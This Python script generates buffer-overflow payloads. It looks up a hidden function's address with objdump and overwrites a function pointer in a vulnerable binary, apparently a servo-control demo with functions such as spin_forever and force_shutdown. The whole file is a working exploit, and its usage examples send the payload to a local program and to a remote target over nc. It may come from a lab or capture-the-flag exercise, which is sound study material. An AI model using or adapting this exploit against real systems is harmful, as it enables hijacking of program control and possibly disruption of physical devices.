#!/usr/bin/env python3
import subprocess, re, struct, sys, argparse

def get_func_addr(binary: str, func: str) -> int:
    """Return the start address of `func` in `binary` via objdump."""
    try:
        out = subprocess.check_output(["objdump", "-d", binary], stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError as e:
        sys.exit(f"Error running objdump on {binary}: {e}")
    text = out.decode(errors="ignore")
    pattern = rf"^([0-9A-Fa-f]+)\s+<{func}>:"  # e.g. 40129e <spin_forever>:
    match = re.search(pattern, text, re.MULTILINE)
    if not match:
        sys.exit(f"Function '{func}' not found in {binary}")
    return int(match.group(1), 16)

def main():
    parser = argparse.ArgumentParser(
        description="Generate buffer-overflow payload to hijack func_ptr into a hidden function",
        epilog=(
            "Examples:\n"
            "  # Call spin_forever in servo_demo, preserve choice=1:\n"
            "  ./gen_payload.py ./servo_demo spin_forever -c 1 | ./servo_demo\n"
            "  # Call force_shutdown, preserve default bufsize 64 and choice 1:\n"
            "  ./gen_payload.py ./servo_demo force_shutdown | nc target 9999\n"
            "  # Custom buffer size and choice:\n"
            "  ./gen_payload.py -b 100 -c 2 ./myprog hidden_func | ./myprog"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(
        "binary",
        help="path to the vulnerable executable (e.g. ./servo_demo)"
    )
    parser.add_argument(
        "function",
        help="name of the hidden function to call (e.g. spin_forever)"
    )
    parser.add_argument(
        "-c", "--choice",
        type=int,
        default=1,
        help="integer (1–5) to set choice so switch survives (default: 1)"
    )
    parser.add_argument(
        "-b", "--bufsize",
        type=int,
        default=64,
        help="size of the vulnerable buffer in bytes (default: 64)"
    )
    args = parser.parse_args()

    addr = get_func_addr(args.binary, args.function)
    # Build payload: bufsize filler, 8-byte LE addr, 4-byte LE choice, newline
    payload = b"A" * args.bufsize
    payload += struct.pack('<Q', addr)
    payload += struct.pack('<I', args.choice)
    payload += b"\n"

    sys.stdout.buffer.write(payload)

if __name__ == '__main__':
    main()
